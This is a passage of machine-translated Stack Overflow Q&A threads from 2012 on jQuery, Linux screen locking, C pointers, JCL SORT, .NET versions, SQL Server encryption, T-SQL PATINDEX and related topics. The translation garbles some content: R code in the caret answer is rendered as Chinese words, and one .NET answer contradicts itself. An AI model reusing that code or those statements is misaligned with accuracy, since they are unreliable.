</script>

<h1><a id="clicker" href="#">Click Me</a></h1>

<ul id="tasks">
  <li id="4">Apples</li>
  <li id="3">Oranges</li>
</ul> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:51:24.843

`jQuery.fn.closest`并非旨在针对最接近的元素匹配，而是最接近的**祖先**（请参阅文档：[http](http://api.jquery.com/closest/) ://api.jquery.com/closest/ ）。

你要做的是在那里选择一个孩子：

```
$("#clicker").click(function(){
    var id = $("#tasks").children("li").attr("id");
    alert(id);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:51:34.680

您可能想尝试：

```
var id = $("#tasks > li:first").attr("id"); 
```

我们用了：

1.  JQuery 的[parent > child](http://api.jquery.com/child-selector/)选择器选择列表`li`下的所有项目 `#tasks`。
2.  然后使用[:first](http://api.jquery.com/first-selector/)选择器`li`从所有列表中选择第一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:51:15.453

`closest`选择元素最近的父元素，而不是最近的元素，可以使用`find`or`children`方法，如果要查找第一个`li`元素，可以使用`:first`选择器或`first`方法过滤结果；

```
$(document).ready(function(){
  $("#clicker").click(function(){
    var id = $("#tasks").find("li:first").attr("id");
    alert(id);
  });
}); 
```

# linux - 如何在linux中使用命令锁定我的显示器？

> ID：13916334
> 
> 赞同：0
> 
> 时间：2012-12-17T14:46:58.867
> 
> 标签：linux, shell, locking

我想用 shell 命令锁定我的桌面。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T14:51:10.980

你用的是什么桌面环境？

使用`GNOME`：

```
gnome-screensaver-command -l 
```

使用`KDE`：

```
qdbus org.freedesktop.ScreenSaver /ScreenSaver Lock 
```

使用`xfce`：

```
xflock4 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:51:23.380

如果您有 xscreensaver 安装程序，这将起作用：

```
xscreensaver -lock 
```

除此之外，这取决于您拥有的DE。

# c - C中的指针哈希表？

> ID：13916335
> 
> 赞同：0
> 
> 时间：2012-12-17T14:47:03.013
> 
> 标签：c, segmentation-fault

我正在尝试构建一个初始化哈希表，其指针指向我程序中的另一个结构。但是当我尝试初始化（H）时，它似乎给了我一个段错误。我想我可能不正确地分配内存，但我不确定这是否是分段错误的真正含义。它的设置方式，H->hashtable应该是一个hashnodes数组吧？hashnodes 本身是指向我的其他结构的指针。为什么我在初始化时只会出现段错误？

```
 #include <stdio.h>
    #include <stdlib.h>

    typedef struct Position{
        char data[12];
        struct Hashnode *previous;
        struct Position *next;
        char letter;
        char direction[5];
    } *position;

    typedef struct Hashnode{
       struct Position *INSIDE;
    } *hashnode;

    typedef struct hash_table{
       hashnode *hashtable
    } *HTABLE;

    HTABLE NewHashtable(){
     HTABLE H = (HTABLE) malloc(sizeof(struct hash_table));
     if(H == NULL){ printf("Malloc for new hashtable failed."); exit(1);}
     return H;
    }

    void initialize(HTABLE H){

        H->hashtable = (hashnode*) malloc(100003*sizeof(hashnode));

        int toofer;
        for(toofer = 0; toofer<100003; toofer++){
                 H->hashtable[toofer]->INSIDE = NULL;
                 }
            }

   int main(){
       HTABLE H = NewHashtable();
       initialize(H);

       return 0;
   } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:54:31.353

这个：

```
HTABLE H = (HTABLE) malloc(sizeof(struct hash_table)); 
```

太可怕了。它将`typedef`:ed 指针（为什么人们仍然这样做？）与底层`struct`名称混合在一起，使读者的工作是确保它们匹配。另外，[那个演员阵容也是个坏主意](https://stackoverflow.com/a/605858/28169)。

它应该是：

```
HTABLE H = malloc(sizeof *H); 
```

如果你坚持保留`typedef`.

也就是说，其中的代码`initialize()`可能无法`malloc()`调用，在依赖之前没有检查过。这是一个非常糟糕的主意。

此外，对于分配的确切*内容*存在混淆。`malloc()`代码分配，`100003*sizeof(hashnode)`但`hashnode`（再次）`typedef`:ed 作为*指针*，而不是`struct`. 然后指针在循环中被取消引用，造成混乱。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:56:58.633

```
 H->hashtable = (hashnode*) malloc(100003*sizeof(hashnode));

    int toofer;
    for(toofer = 0; toofer<100003; toofer++){
             H->hashtable[toofer]->INSIDE = NULL;
             }
        } 
```

第一行为`H->hashtable`. 它包含随机垃圾。

这样，当你进入循环时，`H->hashtable[0]`就是随机垃圾（因为全部`H->hashtable`都是随机垃圾）。但是您尝试在循环中跟踪该随机垃圾指针。取消引用未初始化的指针是获得分段错误的最快方法。

这是一种帮助您查看它的方法。假设您决定将该内存归零以确保安全。您的代码将是：

```
 H->hashtable = (hashnode*) malloc(100003*sizeof(hashnode));
    memset(H->hashtable, 0, 100003 * sizeof(hashnode));

    int toofer;
    for(toofer = 0; toofer<100003; toofer++){
             H->hashtable[toofer]->INSIDE = NULL;
             }
        } 
```

显然，在那之后`memset`,`*(H->hashtable)`是 0，因为这会将所有设置`H->hashtable`为`H->hashtable[0]`0。0 也是如此，因此`H->hashtable[toofer]->INSIDE`取消引用空指针。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:59:21.057

```
H->hashtable = (hashnode*) malloc(100003*sizeof(hashnode)); 
```

应该更好

```
...sizeof(struct Hashnode)... 
```

# pdf - 在 Qt GUI 应用程序中使用无头 QtWebkit

> ID：13916336
> 
> 赞同：0
> 
> 时间：2012-12-17T14:47:08.203
> 
> 标签：pdf, qtwebkit

我需要在 GUI 应用程序中使用 Qtwebkit 功能，但我不想在我的 GUI 应用程序中查看 webkit。主要功能是将 HTML 渲染为 pdf 。我知道我可以用无头 QtWebkit 做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T05:59:22.000

使用[QWebPage](http://doc.qt.digia.com/qt/qwebpage.html)，因为它可以在屏幕上不显示任何内容的情况下工作。就像是：

```
QPrinter printer;
printer.setOutputFormat(QPrinter::PdfFormat);
printer.setOutputFileName(fileName);

page->mainFrame->print(&printer); 
```

# javascript - jquery中是否有任何取消点击事件？

> ID：13916337
> 
> 赞同：1
> 
> 时间：2012-12-17T14:47:10.323
> 
> 标签：javascript, jquery

我想`div`使用 jquery 设置我的样式，我想让它在单击背景时变为蓝色，当我取消单击（我单击页面中除 div 以外的其他部分）时，背景变为红色。对不起，我的英语不好

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:53:38.550

使用点击处理程序，`document`您可以捕获所有点击事件，如果点击不在您的 div 上，您可以恢复为红色

```
$('#yourdiv').click(function() {
   $(this).css('background-color', 'blue');
});

$(document).click(function(e) {
   if(!$(e.target).is('#yourdiv'))
      $('#yourdiv').css('background-color', 'red');
}); 
```

见例子：http: [//jsbin.com/oyunin/1/edit](http://jsbin.com/oyunin/1/edit)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:51:47.093

我不确定性能，但您可以执行以下操作：

```
 $("*").not("your element selector").on("click",function(){
         //other elements click
      }); 
```

一个好的做法是这样做：

$("*","some container").not......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:05:00.550

Try this,

**Jquery Code:**

```
$(document).mouseup(function (e){
    var wrapDiv = $(".wrapper");
    if(wrapDiv.has(e.target).length === 0){
        wrapDiv.css('background-color','red');
    }
    $('.wrapper').click(function(event){
       $('.wrapper').css('background-color','blue')
    });
}); 
```

**CSS code:**

```
<style type="text/css">
.wrapper{
    background-color:#0FF;
    width:200px;
    height:200px;
    }
</style> 
```

**Html code:**

```
<div class="wrapper">
</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T14:49:18.977

我在我的站点中解决它的方法是向有问题`click`的问题添加一个事件，并在一般文档中添加`div`另一个事件。`click`该方法`stopImmediatePropagation()`使其按预期工作：

这是一个带有工作示例的[jsFiddle 。](http://jsfiddle.net/napascual/xMNnF/1/)

HTML：

```
<div class="colored"></div> 
```

查询：

```
$(document).click(function(e){
    $(".active").removeClass("active");
});

$(".colored").live("click",function(e){
    $(this).addClass("active");
    e.stopImmediatePropagation();
}); 
```

CSS：

```
.colored{background:red}
.colored.active{background:blue} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-17T14:52:02.777

如果您想在单击另一个 div 时更改 div，可以在另一个 div 上添加单击事件，或者您可能希望将单击事件添加到文档的整个正文中，以便在未捕获单击事件时并被另一个侦听器停止，它将通过主体的事件侦听器。

# sorting - 无法让 JCL SORT 的 Outfil 工作

> ID：13916339
> 
> 赞同：0
> 
> 时间：2012-12-17T14:47:18.583
> 
> 标签：sorting, mainframe, jcl

我正在学习大型机编程（TSO、JCL、COBOL...），但遇到了一个似乎还无法解决的问题。

我有一个包含 3 个字段的记录的文件，我想使用“outfil”在输出文件中仅包含某些记录。

我的 JCL 如下：

```
000001 //C8112J1  JOB (12345678),C8112,MSGCLASS=H, 
000002 //            MSGLEVEL=(1,1),NOTIFY=C8112 
(...)   
000007 //DSNDEL   EXEC PGM=IDCAMS 
000008 //SYSPRINT DD SYSOUT=* 
000009 //SYSIN    DD * 
000010   DELETE   C8112.DATA.FX.SORT 
000011   SET      MAXCC = 0 
000012 /* 
(...)
000014 //*                  --------- S O R T ----------- 
000020 //MYSORT  EXEC PGM=SORT,COND=(0,NE) 
000021 //SORTIN  DD DSN=C8112.DATA.FX,DISP=SHR 
000022 //SORTOUT DD DSN=C8112.DATA.FX.SORT, 
000023 //           SPACE=(TRK,(100,100),RLSE), 
000024 //           DISP=(NEW,CATLG,DELETE), 
000025 //           DCB=(LRECL=61,RECFM=FB) 
000026 //SYSIN   DD * 
000027   SORT    FIELDS=COPY 
000028 //* SORT  FIELDS=(1,18,CH,A) OU SORT=COPY 
000029   OUTFIL  INCLUDE=(1,18,CH,EQ,C'ANDRADE,LUISA') 
...
000031 //*       OUTREC=(39,41,1,18,19,38) 
000032   END 
000033 //SYSOUT  DD SYSOUT=* 
000034 /* 
```

和输出文件：

```
000001 LUIS,CARLOS       AV.PAULO VI         RMR     
000002 DIAS,PATTY        RUA PEDRO CALMON    LX 
000003 ANDRADE,LUISA     AV. DA LIBERDADE    LX     (1)
000004 SILVA,TONI        PALACIO VALMOR      LX 
000005 ANDRADE,LUISA     AV. DA BOAVISTA     POT    (2) 
000006 CISCO,MANUEL      QUINTA DA AVELEDA   TC 
```

我不应该只得到记录（1）和（2）吗？！顺便说一句，我还尝试了“outrec”来更改字节组织，但它也没有奏效。谁能给我一个提示我做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-18T08:11:43.397

You can use a single * as a comment delimiter in DFSORT rather than //* - which, as has already been pointed out terminates the SYSIN just as if you'd coded /*. (You indeed have a /* later on, I notice.)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T16:53:06.980

尝试以下操作：

```
 000020 //MYSORT  EXEC PGM=SORT,COND=(0,NE) 
  000021 //SORTIN  DD DSN=C8112.DATA.FX,DISP=SHR 
  000022 //SORTOUT DD DSN=C8112.DATA.FX.SORT, 
  000023 //           SPACE=(TRK,(100,100),RLSE), 
  000024 //           DISP=(NEW,CATLG,DELETE), 
  000025 //           DCB=(LRECL=61,RECFM=FB) 
  000026 //SYSIN   DD * 
  000027   SORT    FIELDS=COPY 
  000029   OUTFIL  INCLUDE=(1,18,CH,EQ,C'ANDRADE,LUISA') 
  ...
  000032   END 
  000031 /*
  000033 //SYSOUT  DD SYSOUT=* 
  000034 //* 
```

SORT SYSIN 不允许“评论”。您认为可能是评论的那些行实际上不是。它们终止 SYSIN DD 语句。基本上我刚刚摆脱了：

```
//* SORT  FIELDS=(1,18,CH,A) OU SORT=COPY 
```

和

```
//*       OUTREC=(39,41,1,18,19,38) 
```

then it all works fine. Remember, a JCL comment is not a SORT comment! The stuff after a `DD *` are data, not JCL source statements so JCL type commenting conventions do not work here. The `DD *` is typically terminated by a line starting with: `/*`.

# c# - 如果客户端机器没有我编写应用程序时使用的相同/更高版本的 .net，我的应用程序会运行或出现问题吗？

> ID：13916340
> 
> 赞同：0
> 
> 时间：2012-12-17T14:47:18.800
> 
> 标签：c#, .net

如果我使用 4.5 版对我的 .net 应用程序进行编码，并且将运行该应用程序的客户端计算机只有 .net 2.0 版，那么该应用程序会运行吗？

在 .net（主要是 c#）中编码时，你们是否记住了您的客户可能使用的 .net 版本？

此外，如果我在编写应用程序时使用了一些仅在更高的 .net 版本上可用的新功能（例如 linq2sql、可选参数等），如果客户端机器只有早期版本，这些功能会产生影响吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-17T14:53:16.270

您的客户必须具有您的目标或更高的框架。因此，如果您编写使用 4.5 框架的 .Net 应用程序，您的客户必须在他们的计算机上安装 4.5 框架，否则您的应用程序将无法运行。如果您编写面向 .Net 2.0 框架的应用程序，您的客户端可以运行任何版本的 .Net 2.0 或更高版本并使用您的应用程序。

查看MSDN上的[.Net 版本兼容性文章：](http://msdn.microsoft.com/en-us/library/ff602939.aspx)

> 向后兼容性意味着为特定平台版本开发的应用程序将在该平台的更高版本上运行。.NET Framework 试图最大化向后兼容性：为 .NET Framework 的一个版本编写的源代码应该在 .NET Framework 的更高版本上编译，在 .NET Framework 的一个版本上运行的二进制文件在更高版本上的行为应该相同.NET 框架的。

另请查看 MSDN 上的[.Net Framework Versions and Dependencies](http://msdn.microsoft.com/en-us/library/bb822049.aspx)文章：

> 每个版本的 .NET Framework 都包含公共语言运行时 (CLR)、基类库和其他托管库。本主题按版本介绍 .NET Framework 的主要功能，提供有关底层 CLR 版本和相关开发环境的信息，并标识 Windows 操作系统安装的版本。
> 
> 下图总结了版本历史并标识了 Windows 安装的版本。
> 
> ![.Net 指南](../Images/19ca2c6bafa032f013cfe6686b56ad66.png)

在决定要定位的 .Net 版本时，需要考虑许多因素，包括运行较新框架的好处（它是否具有您想要使用的较新功能）。查看这个 Stack Overflow 问题，了解有关该主题的更多想法：[我的类库应该以哪个 .NET Framework 和 C# 版本为目标？](https://stackoverflow.com/questions/1205908/what-net-framework-and-c-sharp-version-should-i-target-with-my-class-library)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:49:15.963

如果我使用 4.5 版对我的 .net 应用程序进行编码，并且将运行该应用程序的客户端计算机只有 .net 2.0 版，那么该应用程序会运行吗？

**是的！您的客户端将无法运行该应用程序。您的客户需要相同版本的 .net 或更高版本！**

在 .net（主要是 c#）中编码时，你们是否记住了您的客户可能使用的 .net 版本？

**是的，我们通常会询问客户他已经安装了哪个版本，如果您要使用更新版本的框架，请询问客户他是否满意。**

此外，如果我在编写应用程序时使用了一些仅在更高的 .net 版本上可用的新功能（例如 linq2sql、可选参数等），如果客户端机器只有早期版本，这些功能会产生影响吗？

**是的，它肯定会产生这种效果，因为客户端将能够运行针对您编写的 .net 框架版本编译的应用程序**

# c# - 如何将加密密码保存在应用程序内部？

> ID：13916341
> 
> 赞同：1
> 
> 时间：2012-12-17T14:47:23.627
> 
> 标签：c#, .net, security, .net-4.0

我有一些接受许可证加密密钥的应用程序。所以这个应用程序应该保留在里面`string encryptionPassword` ，以便解密该字符串并获取一些数据。

哪种方法最好保留`string encryptionPassword`在应用程序内部，所以如果用户试图破解它并且应该非常难以做到？

有什么线索吗？

谢谢！！！

```
public static string Encrypt(string textToEncrypt, string encryptionPassword)
{
            var algorithm = GetAlgorithm(encryptionPassword);

            byte[] encryptedBytes;
            using (ICryptoTransform encryptor = algorithm.CreateEncryptor(algorithm.Key, algorithm.IV))
            {
                byte[] bytesToEncrypt = Encoding.UTF8.GetBytes(textToEncrypt);
                encryptedBytes = InMemoryCrypt(bytesToEncrypt, encryptor);
            }
            return Convert.ToBase64String(encryptedBytes);
}

public static string Decrypt(string encryptedText, string encryptionPassword)
{
            var algorithm = GetAlgorithm(encryptionPassword);

            byte[] descryptedBytes;
            using (ICryptoTransform decryptor = algorithm.CreateDecryptor(algorithm.Key, algorithm.IV))
            {
                byte[] encryptedBytes = Convert.FromBase64String(encryptedText);
                descryptedBytes = InMemoryCrypt(encryptedBytes, decryptor);
            }
            return Encoding.UTF8.GetString(descryptedBytes);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-17T14:54:29.410

[`SecureString`](http://msdn.microsoft.com/en-us/library/system.security.securestring.aspx)可能符合要求：

> 表示应保密的文本。文本在使用时被加密以保护隐私，并在不再需要时从计算机内存中删除。

还：

> 对象与对象的`SecureString`相似之处`String`在于它具有文本值。但是，`SecureString`对象的值是自动加密的，可以修改，直到您的应用程序将其标记为只读，并且可以由您的应用程序或 .NET Framework 垃圾收集器从计算机内存中删除。

和

> 实例的值在`SecureString`初始化实例或修改值时会自动加密。`MakeReadOnly`您的应用程序可以通过调用该方法使实例不可变并防止进一步修改。

但是请注意，确定足够多的用户将设法读取这样的密码 - 这可能需要时间和精力，但这是可能的

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:21:15.293

存储密钥以防止黑客攻击的最佳答案是：**您不需要**.

有关替代方法，请参阅[本文。](http://www.brandonstaggs.com/2007/07/26/implementing-a-partial-serial-number-verification-system-in-delphi/)

> 该解决方案称为部分密钥验证系统，因为您的软件从不测试完整密钥。由于您的应用程序不包含测试密钥每个部分的代码，因此破解者不可能仅通过反汇编您的可执行代码来构建有效的有效密钥生成器。
> 
> 该系统不是完全防止裂缝的方法。破解者仍然可以编辑您的可执行文件以跳过验证码。但是这样的破解只适用于一个特定的版本，我会建议一些技巧来让他们的工作更难成功完成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:55:28.267

您应该尝试使用安全字符串。它会自动加密内存中的字符串值。

# r - 带有插入符号错误的 SVM 分类（基本）

> ID：13916343
> 
> 赞同：8
> 
> 时间：2012-12-17T14:47:37.860
> 
> 标签：r, svm, kernlab

我可能在这里犯了一个非常简单（和愚蠢）的错误，但我无法弄清楚。我正在使用来自 Kaggle ( [Digit Recognizer](http://www.kaggle.com/c/digit-recognizer/data) ) 的一些数据，并尝试将 SVM 与 Caret 包一起使用来进行一些分类。如果我只是将标签值作为数字类型`train`插入函数，那么 Caret 中的函数似乎默认为回归并且性能很差。所以我接下来尝试使用函数将其转换为因子`factor()`并尝试运行 SVM 分类。这是一些代码，我在其中生成了一些虚拟数据，然后将其插入 Caret：

```
library(caret)
library(doMC)
registerDoMC(cores = 4)

ytrain <- factor(sample(0:9, 1000, replace=TRUE))
xtrain <- matrix(runif(252 * 1000,0 , 255), 1000, 252)

preProcValues <- preProcess(xtrain, method = c("center", "scale"))
transformerdxtrain <- predict(preProcValues, xtrain)

fitControl <- trainControl(method = "repeatedcv", number = 10, repeats = 10)
svmFit <- train(transformerdxtrain[1:10,], ytrain[1:10], method = "svmradial") 
```

我收到此错误：

```
Error in kernelMult(kernelf(object), newdata, xmatrix(object)[[p]], coef(object)[[p]]) : 
  dims [product 20] do not match the length of object [0]
In addition: Warning messages:
1: In train.default(transformerdxtrain[1:10, ], ytrain[1:10], method = "svmradial") :
  At least one of the class levels are not valid R variables names; This may cause errors if class probabilities are generated because the variables names will be converted to: X0, X1, X2, X3, X4, X5, X6, X7, X8, X9
2: In nominalTrainWorkflow(dat = trainData, info = trainInfo, method = method,  :
  There were missing values in resampled performance measures. 
```

有人可以告诉我我做错了什么吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T20:54:59.193

你有 10 个不同的类，但你只包括 10 个案例`train()`。这意味着当您重新采样时，您通常不会在分类器的各个实例中拥有所有 10 个类。`train()`很难组合这些不同类别的 SVM 的结果。

您可以通过增加案例数量、减少类别数量甚至使用不同的分类器的某种组合来解决此问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-16T18:12:46.970

我发现在数字识别用例中使用插入符号很有挑战性。我认为部分问题是标签数据是数字。当插入符号尝试从中创建变量时，它们最终以数字开头，这确实不被接受为 R 变量。

就我而言，我通过使用 dplyr 离散化标签数据来解决它。这假设您的训练数据被放入“训练”数据框中。

# 将标签离散化为 label2

train$label2=dplyr::recode(train$label, `0`="zero", `1`="one", `2`="two", `3`="three", `4`="four", `5`="five", `6`="six", `7`="七”，`8`=“八”，`9`=“九”）

# 重新排列列，以便您可以在原始标签旁边看到新的 label2

火车 <- 火车 [, c((1),(786),(2:785))] 头（火车）

# 将标签更改为离散化标签2的分解版本

火车$标签<-因子（火车$标签2）

# 杀死 label2 因为它是一个临时变量

训练$label2 <- NULL

# 查看结果

头（火车）

# sql-server - SQL Server 2012 加密

> ID：13916346
> 
> 赞同：2
> 
> 时间：2012-12-17T14:47:55.043
> 
> 标签：sql-server, encryption

寻找一些最佳实践和加密方面的帮助。

我有一个包含姓名、地址和联系信息的客户表。

它现在有超过 15000 条记录，我想加密整个表（12 列）还是只加密某些列？

我们在谈论什么样的性能打击？

另外，我如何在生产数据库上执行此操作？

一步一步会很棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:22:51.383

[您应该使用透明数据库加密](http://msdn.microsoft.com/en-us/library/bb934049.aspx)对整个数据库进行加密。顾名思义，TDE 是完全透明的，并且绝对不需要对您的应用程序进行任何更改。也非常有表现力。它是企业版功能。

对于小额预算，您必须使用列级加密，请参阅[Encrypt a Column of Data](http://msdn.microsoft.com/en-us/library/ms179331.aspx)。列级加密对您的应用程序有严重影响，因为您的代码必须适应无法搜索列加密数据的事实，请参阅[搜索加密数据](http://blogs.msdn.com/b/lcris/archive/2005/12/22/506931.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:52:04.117

如果您正在处理敏感信息（例如，如果您正在处理银行客户数据），那么加密整个表将是最佳实践。否则，您可以加密敏感信息，例如姓名、地址、电子邮件 ID、Acc No 等。加密 CustId 是不必要的，因为它没有任何意义，而且它会被许多子表引用。希望这对您有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:52:26.640

我建议散列（即一种加密方式）**仅用于验证**的信息- 即密码/信用卡号，并提供对其余部分的 SSL 访问。

# css - Wordpress 不更新 CSS 行高

> ID：13916349
> 
> 赞同：0
> 
> 时间：2012-12-17T14:48:07.117
> 
> 标签：css, wordpress

我正在 wordpress.com 上编辑自定义 css，我试图覆盖`ie.css`我认为我没有任何权力的行高（我认为 wordpress 注入）

这是我编写的用于覆盖样式的css代码`ie.css`

```
.ie7 .main-navigation li a {
    line-height: auto !important;
} 
```

出于某种奇怪的原因，css 不会更新，即使我让它看起来像这样：

```
a {
    line-height: auto !important;
} 
```

我检查了元素以查看是否正在应用样式，但不是。我也多次清除缓存..仍然没有。

wordpress.com 自定义 css 是否不允许行高编辑？为什么样式不会在 wordpress.com 上呈现的一些可能性是什么？

博客的链接是： http: [//letstalktermites.wordpress.com/](http://letstalktermites.wordpress.com/)

**编辑**：我只在 ie7 和 ie8 中遇到这些麻烦

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:53:10.403

行高没有“自动”值。尝试“正常”...

# regex - TSQL允许匹配右方括号也来自字符串

> ID：13916350
> 
> 赞同：3
> 
> 时间：2012-12-17T14:48:13.183
> 
> 标签：regex, tsql

请注意，我想在字符串中找到我指定的特殊字符。

```
DECLARE @Temp1 NVARCHAR(100)
SET @Temp1 ='Rajesh[sdf]' 
SELECT PATINDEX('%[^0-9A-Za-z .&()[[,''-]%',@Temp1) 
```

经过长时间的发现，我得到了允许左方括号我们必须放两次 [ 即 [[ 但右括号不是这种情况 表达式**PATINDEX('%[^0-9A-Za-z .&()[ [],''-]%',@Temp1)**没有给出预期的正确结果。

```
DECLARE @Temp1 NVARCHAR(100)
SET @Temp1 ='Rajesh[sdf]' 
SELECT PATINDEX('%[^0-9a-z .&()[[],''-]%',@Temp1) 
```

上面的代码返回 patindex 0 因为我删除了大写。它应该返回 1 以匹配“R”。那么什么是右括号的正确匹配。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:54:29.297

根据[这个链接](http://bytes.com/topic/sql-server/answers/79113-patindex-character)，看起来`[[`不是逃避`[`而是`[[]`。换句话说，左右方括号对*中*的左方括号。

既然如此，你的`PATINDEX`应该如下。

```
PATINDEX('%[^0-9A-Za-z .&()[[]],''-]%',@Temp1) 
```

请注意附加值，`]`因为第一个`]`关闭了`[]`要匹配的对`[`。

**编辑＃1：**

如果你要尝试这样的事情怎么办？我们正在做的是首先用令人讨厌的`[]`字符替换`()`，然后搜索不在列表中的特殊字符。

```
DECLARE @Temp1 NVARCHAR(100)
SET @Temp1 ='Rajesh[sdf]'
SET @Temp1 = REPLACE(@Temp1,'[','(')
SET @Temp1 = REPLACE(@Temp1,']',')')
SELECT PATINDEX('%[^0-9A-Za-z .&(),''-]%',@Temp1) 
```

不幸的是，我目前无法对此进行测试，因为此时我还没有 SQL Server 的工作副本。一旦我安装了一个，我会尝试测试一下。

**编辑＃2：**

现在我已经能够测试，我已经确认这是一个可能的解决方案。

```
DECLARE @Temp1 NVARCHAR(100)
SET @Temp1 ='Rajesh[sdf]+'
SET @Temp1 = REPLACE(@Temp1,'[','.')
SET @Temp1 = REPLACE(@Temp1,']','.')
SET @Temp1 = REPLACE(@Temp1,'-','.')
SELECT PATINDEX('%[^0-9a-z .&(),'']%',@Temp1 COLLATE Latin1_General_BIN) 
```

有几个挑战需要克服。

*   我的数据库的代码页*不区分大小写*(SQL_Latin1_General_CP1_ **CI** _AS)。我需要用它`COLLATE`来解决这个问题。请注意，我使用了`BIN`排序规则，因为即使`CS`排序规则也没有按预期运行。这解决了删除`A-Z`仍然不匹配的问题`R`。
*   `-`原始表达式中的字符`PATINDEX`无法正常工作。这可能是因为它是表达式中的特殊字符（即“通过” `a-z`）。我试着像逃避它一样`--`，虽然这有效，但我的附加测试用例 a`+`被破坏了。我觉得这很奇怪，但最后决定`-`用另一个我知道我会拒绝的字符替换可能会更容易（`.`）。
*   字符串`REPLACE`函数通过从表达式中完全删除有问题的特殊字符来降低`PATINDEX`（并使其实际工作）的复杂性。假设您在 中始终至少有一个要拒绝的字符`PATINDEX`，则使用这些`REPLACE`表达式应该是一种可行的解决方案。从理论上讲，它会使事情变慢一点，但这只是需要在现实生活中进行测试，看看它是否重要。

我知道这个解决方案有效，因为我已经能够对其进行测试。只需要一点时间就可以启动并运行 SQL Server Express Edition！

# asp.net - ASP内联，将时间添加到gridview列时间类型

> ID：13916354
> 
> 赞同：0
> 
> 时间：2012-12-17T14:48:24.123
> 
> 标签：asp.net, inline

如何从内联控制字段中添加或减去时间？

```
<asp:TemplateField HeaderText="Time" SortExpression="eventTime"> 
  <EditItemTemplate> 
    <asp:TextBox ID="TextBox1" runat="server" Text='<%# Bind("eventTime") %>'></asp:TextBox> 
  </EditItemTemplate> 
  <ItemTemplate> 
    <asp:Label ID="Label1" runat="server" Text='<%# Bind("eventTime") %>'></asp:Label> 
  </ItemTemplate>  
</asp:TemplateField> 
```

通常它会在 VB.net 中是这样的......

```
Dim mytime As DateTime 
mytime = mytime.AddHours(7) 
```

但我想内联。

也可以使用来自另一个参数的变量，比如

```
<asp:Label ID="Label1" runat="server" Text='<%# Bind("eventTime") + Bind("timeOffset") %>'></asp:Label>to calculate the actual time to display on the fly? 
```

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:32:54.843

这有效....

```
<%# String.Format("{0:hh:mm:ss tt}", Container.DataItem["eventTime"]) %> 
```

# actionscript-3 - Flixel 文件在 mxmlc 中编译但未运行

> ID：13916355
> 
> 赞同：2
> 
> 时间：2012-12-17T14:48:27.883
> 
> 标签：actionscript-3, mxmlc, flixel

设置：我是 Actionscript 3 和 mxmlc 的新手，我正在运行带有 multilibs 的 64 位 Arch Linux。Arch Linux 发行版既不提供也不支持 Flex SDK 和 flixel，所以我将它们分别提取到 ~/devtools/flexsdk 和 ~/devtools/flixel。我已将 Flex SDK .../bin/ 添加到我的路径中，并将 flixel 的 .../org/ 复制到我所有的 flixel 项目根目录中。

问题：我编译的每个纯 as3 的 HelloWorld.as 都可以编译并运行良好，但是如果我尝试使用 flixel 库，则生成的 SWF 会显示一个空白屏幕，无论是黑色还是白色。我可以在浏览器中右键单击正在运行的 SWF，它会显示“电影未加载...”和“关于 Adob​​e Flash Player 11.2.202.258...”。发生在 Firefox 17 和 Chromium 23 中。

研究：我已经尝试了所有我能找到的 flixel HelloWorld，包括[Adam Atomic 的](https://github.com/AdamAtomic/HelloWorld). 所有人都受此困扰，我得到的唯一错误是告诉我没有预加载器。

我编译了具有预加载器的[EZplatformer](https://github.com/AdamAtomic/EZPlatformer)以查看这是否是问题所在，即使使用 -debug=true 编译它也没有任何错误，但仍然是相同的空白屏幕。

问题：我猜我需要做更多的事情来设置 flixel 或设置 mxmlc 以使用 flixel，但我不知道是什么。有谁知道这个问题是什么或我哪里出错了？flixel-master 代码中是否有与 Flex SDK 4.6 mxmlc 不兼容的内容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-08T04:57:57.607

I had the same problem, this works for me:

         mxmlc -static-link-runtime-shared-libraries=true src/HelloWorld.as

Like this tutorial says, I hope you find this useful:

         [https://github.com/jcromartie/HelloWorld](https://github.com/jcromartie/HelloWorld)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T09:47:27.803

不幸的是，Linux 并不是一个很好的 Flash 平台。很多问题，缺乏支持。

根据我在 Linux 中使用 as3 的经验，黑屏表明 Flash 播放器甚至没有启动。所以这不是运行时错误，更可能是编译不兼容。如果我没记错的话，Linux 中的 Flash 播放器仅在 32 位系统上运行。对于 64 位支持，您必须做一些额外的研究。

# python - 如何在 Python 中正确返回类实例列表

> ID：13916357
> 
> 赞同：2
> 
> 时间：2012-12-17T14:48:44.617
> 
> 标签：python, list, class

```
class ligne():
    def __init__ (self, stops):
